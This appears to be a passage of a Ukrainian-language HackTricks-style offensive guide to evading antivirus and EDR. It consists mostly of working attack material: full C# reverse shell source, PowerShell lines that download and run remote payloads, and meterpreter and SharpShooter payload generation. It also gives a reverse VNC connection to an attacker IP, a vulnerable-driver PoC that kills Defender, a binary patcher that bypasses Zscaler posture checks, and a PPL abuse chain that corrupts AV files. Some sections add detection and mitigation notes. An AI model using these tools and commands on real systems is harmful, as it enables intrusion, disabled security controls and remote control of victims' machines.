## TokenStomping

Token stomping — це техніка, яка дозволяє зловмиснику **manipulate the access token or a security prouct like an EDR or AV**, що дає змогу знизити його привілеї так, щоб процес не помер, але в нього не було дозволів перевіряти шкідливу активність.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори (handles) токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), досить просто розгорнути Chrome Remote Desktop на машині жертви і використовувати його для takeover та підтримки persistence:
1. Download from https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть на MSI файл для Windows, щоб завантажити MSI.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер попросить авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Запустіть вказаний параметр з невеликими налаштуваннями: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Зверніть увагу на параметр pin, який дозволяє встановити PIN без використання GUI).

## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у дорослих (mature) середовищах.

Кожне середовище, з яким ви зіткнетесь, матиме свої сильні та слабкі сторони.

Раджу переглянути цей доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті Advanced Evasion техніки.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **послідовно видаляє частини бінарного файлу** доти, поки **не визначить, яку частину Defender** вважає шкідливою, і повідомить вам результати.\
Інструмент, що робить **те саме**, — [**avred**](https://github.com/dobin/avred) з відкритою веб-службою за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 всі версії Windows мали **Telnet server**, який ви могли встановити (як адміністратор), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** під час завантаження системи і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Change telnet port** (стелс) та вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажити з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вибирайте bin downloads, а не setup)

**ON THE HOST**: Виконайте _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть двійковий файл _**winvnc.exe**_ та **новостворений** файл _**UltraVNC.ini**_ на **victim**

#### **Reverse connection**

The **attacker** повинен запустити на своєму **host** двійковий файл `vncviewer.exe -listen 5900`, щоб бути **prepared** до прийому зворотного **VNC connection**. Потім, на **victim**: запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Щоб зберегти stealth, не робіть наступного

- Не запускайте `winvnc`, якщо він уже працює — інакше ви викличете [popup](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій же директорії — це викличе відкриття [the config window](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` за допомогою якїсь довідки — інакше ви викличете [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажити з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **start the lister** командою `msfconsole -r file.rc` та **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using компілятор
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Детальніше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – вимкнення AV/EDR з простору ядра

Storm-2603 використав невелику консольну утиліту відому як **Antivirus Terminator** для вимкнення endpoint-захисту перед розгортанням ransomware. Інструмент приносить свій **вразливий, але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій у просторі ядра, які навіть служби AV з Protected-Process-Light (PPL) не можуть заблокувати.

Ключові висновки
1. **Підписаний драйвер**: Файл, що записується на диск — `ServiceMouse.sys`, але бінарник — це легітимно підписаний драйвер `AToolsKrnl64.sys` з “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли увімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, роблячи `\\.\ServiceMouse` доступним з простору користувача.
3. **IOCTLи, які драйвер експонує**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершити довільний процес за PID (використовується для вбивства служб Defender/EDR) |
| `0x990000D0` | Видалити довільний файл на диску |
| `0x990001D0` | Вивантажити драйвер та видалити сервіс |

Мінімальний proof-of-concept на C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить захист у user-mode; код, що виконується в ядрі, може відкривати *protected* процеси, завершувати їх або модифікувати об’єкти ядра незалежно від PPL/PP, ELAM чи інших механізмів жорсткої захисту.

Виявлення / Мітігація
•  Увімкніть список блокування вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.
•  Слідкуйте за створенням нових *kernel* сервісів і повідомляйте, коли драйвер завантажується з директорії, доступної для запису всім, або якщо його немає в allow-list.
•  Моніторьте дескриптори в user-mode до кастомних device-об’єктів із подальшими підозрілими викликами `DeviceIoControl`.

### Обхід Posture-перевірок Zscaler Client Connector шляхом патчування бінарників на диску

Zscaler’s **Client Connector** застосовує правила перевірки стану пристрою локально і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі дизайнерські рішення роблять можливим повний обхід:

1. Оцінка posture відбувається **повністю на стороні клієнта** (сервер отримує лише булеве значення).
2. Внутрішні RPC-ендпоїнти перевіряють лише, що підключений виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

За допомогою **патчування чотирьох підписаних бінарників на диску** обидва механізми можна нейтралізувати:

| Бінарник | Початкова логіка, що змінена | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається задовільною |
| `ZSAService.exe` | Опосередкований виклик до `WinVerifyTrust` | Замінено на NOP ⇒ будь-який (навіть непідписаний) процес може прив’язатися до RPC pipe-ів |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Пропущено |

Фрагмент мінімального патчера:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стеку сервісів:

* **Усі** перевірки стану відображаються як **green/compliant**.
* Непідписані або змінені бінарники можуть відкривати named-pipe RPC endpoints (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Компрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як рішення, що базуються виключно на клієнтській довірі, та прості перевірки підпису можна обійти кількома байт-патчами.

## Зловживання Protected Process Light (PPL) для модифікації AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) запроваджує ієрархію signer/level так, що лише процеси з рівнем не нижче можуть маніпулювати один одним. Зловмиснику: якщо можна легітимно запустити бінарник із підтримкою PPL і контролювати його аргументи, то можна перетворити нешкідливу функцію (наприклад, логування) у обмежену, підкріплену PPL примітивну операцію запису у захищені директорії, які використовуються AV/EDR.

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (та будь-які підвантажені DLL) має бути підписаний з PPL-capable EKU.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Має бути запрошено сумісний рівень захисту, який відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware підписувачів, `PROTECTION_LEVEL_WINDOWS` для Windows підписувачів). Неправильні рівні призведуть до помилки при створенні.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Відкритий інструмент-помічник: CreateProcessAsPPL (вибирає рівень захисту та пересилає аргументи до цільового EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарник `C:\Windows\System32\ClipUp.exe` самозапускається й приймає параметр для запису файлу журналу в шлях, вказаний викликом.
- Коли запущено як процес PPL, запис файлу відбувається з підтримкою PPL.
- ClipUp не може розбирати шляхи, що містять пробіли; використовуйте 8.3 short paths, щоб вказувати на зазвичай захищені розташування.

8.3 short path helpers
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-capable LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху журналу ClipUp, щоб примусити створення файлу в захищеному каталозі AV (наприклад, Defender Platform). Використовуйте 8.3 short names за потреби.
3) Якщо цільовий бінарник зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження до того, як AV запуститься, встановивши автозапускову службу, яка надійно запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис з підтримкою PPL відбувається до того, як AV заблокує свої бінарники, що призводить до пошкодження цільового файлу та неможливості запуску.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ви не можете контролювати вміст, який ClipUp записує, окрім розташування; примітив підходить більше для corruption, а не для точного впровадження контенту.
- Потребує локальних прав admin/SYSTEM для встановлення/запуску сервісу й вікна для перезавантаження.
- Часування критичне: ціль не має бути відкритою; виконання під час завантаження уникає блокувань файлів.

Detections
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо його породжує нестандартний лоунчер, під час завантаження.
- Нові сервіси, налаштовані на автозапуск підозрілих бінарників і що систематично стартують до Defender/AV. Досліджуйте створення/зміну сервісів перед помилками запуску Defender.
- Моніторинг цілісності файлів у директоріях бінарників/Platform Defender; несподівані створення/зміни файлів процесами з прапорами protected-process.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівнів PPL не-AV бінарниками.

Mitigations
- WDAC/Code Integrity: обмежте, які підписані бінарники можуть запускатися як PPL і під якими батьками; блокувати виклик ClipUp поза легітимними контекстами.
- Гігієна сервісів: обмежте створення/зміну сервісів з автозапуском та моніторьте маніпуляції порядком запуску.
- Переконайтесь, що Defender tamper protection та early-launch захисти увімкнені; досліджуйте помилки запуску, що вказують на корупцію бінарників.
- Розгляньте відключення генерації коротких імен 8.3 на томах, що містять інструменти безпеки, якщо це сумісно з вашим середовищем (ретельно протестуйте).

References for PPL and tooling
- Огляд Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Довідник EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (перевірка порядку): https://learn.microsoft.com/sysinternals/downloads/procmon
- Лаунчер CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Опис техніки (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
